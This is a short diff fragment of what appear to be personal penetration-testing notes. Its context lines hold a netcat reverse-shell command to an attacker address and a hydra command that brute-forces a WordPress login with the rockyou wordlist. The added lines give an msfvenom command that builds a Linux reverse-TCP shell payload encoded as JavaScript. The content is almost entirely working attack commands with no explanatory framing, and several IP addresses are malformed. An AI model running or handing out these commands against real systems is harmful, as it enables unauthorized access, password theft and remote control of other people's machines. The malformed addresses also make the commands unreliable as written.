@@ -191,3 +191,6 @@ nc -c /bin/bash\ -i 192.168.1129.1119 5555 0>&1
 bruteforcing wplogin hydra
 hydra -l admin -P /home/kali/Desktop/10.11.1/rockyou.txt 10.11.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
 In&testcookie=1:S=Location'
+
+Msfvenom JS payload:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.11944 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
